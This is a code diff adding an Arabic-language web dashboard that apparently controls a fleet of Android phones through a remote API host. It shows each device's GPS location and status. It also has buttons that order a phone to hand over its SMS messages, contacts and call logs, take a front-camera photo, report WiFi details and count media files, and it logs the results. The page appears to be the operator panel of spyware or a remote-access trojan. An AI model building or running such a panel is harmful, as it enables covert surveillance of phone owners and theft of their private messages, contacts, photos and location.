@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة التحكم</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
+        body { background: #0d1117; color: #fff; padding: 20px; min-height: 100vh; }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            background: #161b22;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            border: 1px solid #30363d;
+        }
+        .navbar a {
+            color: #58a6ff;
+            text-decoration: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            transition: background 0.2s;
+        }
+        .navbar a:hover { background: #21262d; }
+        .navbar .title { font-size: 18px; font-weight: bold; color: #58a6ff; }
+
+        h2 { color: #8b949e; margin: 25px 0 15px; font-size: 17px; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
+
+        .status {
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 13px;
+            background: #21262d;
+            display: inline-block;
+            margin-bottom: 15px;
+        }
+        .status.ok { background: #238636; }
+        .status.err { background: #da3633; }
+
+        .devices-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 15px;
+        }
+
+        .device-card {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 12px;
+            padding: 18px;
+            transition: border-color 0.2s, transform 0.2s;
+        }
+        .device-card:hover { border-color: #58a6ff; transform: translateY(-2px); }
+
+        .device-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+        .device-name { font-size: 16px; font-weight: bold; color: #58a6ff; }
+        .online-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        .online-dot.on { background: #3fb950; box-shadow: 0 0 8px #3fb950; animation: pulse 2s infinite; }
+        .online-dot.off { background: #6e7681; }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .device-info { font-size: 13px; color: #c9d1d9; line-height: 1.9; }
+        .device-info span { color: #8b949e; margin-left: 6px; }
+
+        .actions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid #30363d;
+        }
+        .btn {
+            padding: 7px 12px;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            background: #21262d;
+            color: #c9d1d9;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn:hover { background: #30363d; border-color: #58a6ff; color: #58a6ff; }
+        .btn:active { transform: scale(0.95); }
+        .btn.primary { background: #238636; border-color: #238636; color: #fff; }
+        .btn.primary:hover { background: #2ea043; }
+        .btn.danger { background: #da3633; border-color: #da3633; }
+        .btn.danger:hover { background: #f85149; }
+
+        .logs-table { width: 100%; border-collapse: collapse; font-size: 13px; background: #161b22; border-radius: 12px; overflow: hidden; }
+        .logs-table th, .logs-table td { padding: 12px; text-align: right; border-bottom: 1px solid #21262d; }
+        .logs-table th { background: #21262d; color: #8b949e; font-weight: normal; }
+        .logs-table tr:last-child td { border-bottom: none; }
+        .logs-table tr:hover { background: #1c2128; }
+
+        .feature-badge {
+            display: inline-block;
+            background: #1f6feb;
+            color: #fff;
+            padding: 3px 10px;
+            border-radius: 10px;
+            font-size: 11px;
+        }
+
+        .empty {
+            text-align: center;
+            color: #6e7681;
+            padding: 40px 20px;
+            background: #161b22;
+            border-radius: 12px;
+            border: 1px dashed #30363d;
+        }
+        .empty small { color: #484f58; }
+        .loading { text-align: center; padding: 30px; color: #8b949e; }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .stat-card {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+        }
+        .stat-num { font-size: 24px; font-weight: bold; color: #58a6ff; }
+        .stat-label { font-size: 12px; color: #8b949e; margin-top: 5px; }
+
+        @media (max-width: 600px) {
+            .actions .btn { flex: 1; min-width: 80px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <div class="title">🎛️ لوحة التحكم</div>
+        <a href="/">← العودة للرئيسية</a>
+    </div>
+
+    <div class="status" id="status">⏳ جاري التحميل...</div>
+
+    <div class="stats" id="stats"></div>
+
+    <h2>📱 الأجهزة المتصلة</h2>
+    <div class="devices-grid" id="devices">
+        <div class="loading">⏳ جاري التحميل...</div>
+    </div>
+
+    <h2>📋 سجل الأوامر والميزات</h2>
+    <div id="logs-container">
+        <div class="loading">⏳ جاري التحميل...</div>
+    </div>
+
+    <script>
+        const API = 'https://ssddaaf.almanartransd.com/API';
+
+        async function loadDevices() {
+            try {
+                const res = await fetch(`${API}/devices.php`);
+                const data = await res.json();
+                const container = document.getElementById('devices');
+                const status = document.getElementById('status');
+
+                if (!data.ok) {
+                    status.className = 'status err';
+                    status.textContent = '❌ خطأ في الاتصال بالخادم';
+                    container.innerHTML = '<div class="empty">تعذر الاتصال بالخادم<br><small>تأكد من تشغيل VPN</small></div>';
+                    return;
+                }
+
+                status.className = 'status ok';
+                status.textContent = `🟢 متصل — ${data.devices.length} جهاز`;
+
+                // الإحصائيات
+                const online = data.devices.filter(d => {
+                    const diff = (Date.now() - new Date(d.last_seen).getTime()) / 1000;
+                    return diff < 120;
+                }).length;
+
+                document.getElementById('stats').innerHTML = `
+                    <div class="stat-card"><div class="stat-num">${data.devices.length}</div><div class="stat-label">إجمالي الأجهزة</div></div>
+                    <div class="stat-card"><div class="stat-num">${online}</div><div class="stat-label">متصل الآن</div></div>
+                `;
+
+                if (!data.devices || data.devices.length === 0) {
+                    container.innerHTML = '<div class="empty">لا توجد أجهزة متصلة<br><small>ثبّت التطبيق على هاتفك وشغّل الخدمة</small></div>';
+                    return;
+                }
+
+                container.innerHTML = '';
+                data.devices.forEach(d => {
+                    const lastSeen = new Date(d.last_seen);
+                    const diff = (Date.now() - lastSeen.getTime()) / 1000;
+                    const isOnline = diff < 120;
+                    const deviceId = d.device_id;
+
+                    const card = document.createElement('div');
+                    card.className = 'device-card';
+                    card.innerHTML = `
+                        <div class="device-header">
+                            <div class="device-name">📱 ${d.manufacturer || '?'} ${d.model || '?'}</div>
+                            <span class="online-dot ${isOnline ? 'on' : 'off'}"></span>
+                        </div>
+                        <div class="device-info">
+                            <div><span>🆔 المعرّف:</span> ${deviceId.substring(0, 25)}...</div>
+                            <div><span>🤖 أندرويد:</span> ${d.android_version || '?'}</div>
+                            <div><span>🔋 البطارية:</span> ${d.battery || 0}%</div>
+                            <div><span>📍 الموقع:</span> ${d.latitude && d.longitude ? `${parseFloat(d.latitude).toFixed(3)}, ${parseFloat(d.longitude).toFixed(3)}` : 'غير متاح'}</div>
+                            <div><span>⏰ آخر اتصال:</span> ${lastSeen.toLocaleString('ar')}</div>
+                        </div>
+                        <div class="actions">
+                            <button class="btn primary" onclick="sendCmd('${deviceId}', 'cmd_info')">ℹ️ معلومات</button>
+                            <button class="btn" onclick="sendCmd('${deviceId}', 'cmd_battery')">🔋 بطارية</button>
+                            <button class="btn" onclick="sendCmd('${deviceId}', 'cmd_location')">📍 موقع</button>
+                            <button class="btn" onclick="sendCmd('${deviceId}', 'cmd_photo_front')">📸 صورة</button>
+                            <button class="btn" onclick="sendCmd('${deviceId}', 'cmd_sysinfo')">📊 موسع</button>
+                            <button class="btn" onclick="sendCmd('${deviceId}', 'cmd_vibrate')">📳 اهتزاز</button>
+                            <button class="btn" onclick="sendCmd('${deviceId}', 'cmd_flash')">🔦 فلاش</button>
+                            <button class="btn" onclick="sendCmd('${deviceId}', 'cmd_contacts')">👥 جهات</button>
+                            <button class="btn" onclick="sendCmd('${deviceId}', 'cmd_sms_read')">📥 رسائل</button>
+                            <button class="btn" onclick="sendCmd('${deviceId}', 'cmd_call_log')">📞 مكالمات</button>
+                            <button class="btn" onclick="sendCmd('${deviceId}', 'cmd_wifi_full')">📶 WiFi</button>
+                            <button class="btn" onclick="sendCmd('${deviceId}', 'cmd_media_count')">🖼️ وسائط</button>
+                        </div>
+                    `;
+                    container.appendChild(card);
+                });
+            } catch (e) {
+                console.error(e);
+                document.getElementById('status').className = 'status err';
+                document.getElementById('status').textContent = '❌ خطأ في الاتصال';
+            }
+        }
+
+        async function loadLogs() {
+            try {
+                const res = await fetch(`${API}/logs.php?limit=100`);
+                const data = await res.json();
+                const container = document.getElementById('logs-container');
+
+                if (!data.ok || !data.logs || data.logs.length === 0) {
+                    container.innerHTML = '<div class="empty">لا توجد سجلات بعد</div>';
+                    return;
+                }
+
+                let html = '<table class="logs-table"><thead><tr><th>الوقت</th><th>الميزة</th><th>النتيجة</th></tr></thead><tbody>';
+                data.logs.forEach(l => {
+                    html += `
+                        <tr>
+                            <td>${new Date(l.created_at).toLocaleString('ar')}</td>
+                            <td><span class="feature-badge">${l.feature}</span></td>
+                            <td>${(l.result || '-').substring(0, 80)}</td>
+                        </tr>
+                    `;
+                });
+                html += '</tbody></table>';
+                container.innerHTML = html;
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        async function sendCmd(deviceId, command) {
+            if (!confirm('هل تريد إرسال هذا الأمر؟')) return;
+            try {
+                const res = await fetch(`${API}/send_command.php`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ device_id: deviceId, command: command })
+                });
+                const data = await res.json();
+                if (data.ok) {
+                    alert('✅ تم إرسال الأمر بنجاح');
+                    setTimeout(loadLogs, 2000);
+                } else {
+                    alert('❌ فشل الإرسال: ' + (data.error || ''));
+                }
+            } catch (e) {
+                alert('❌ خطأ في الاتصال: ' + e.message);
+            }
+        }
+
+        loadDevices();
+        loadLogs();
+        setInterval(() => { loadDevices(); loadLogs(); }, 15000);
+    </script>
+</body>
+</html>
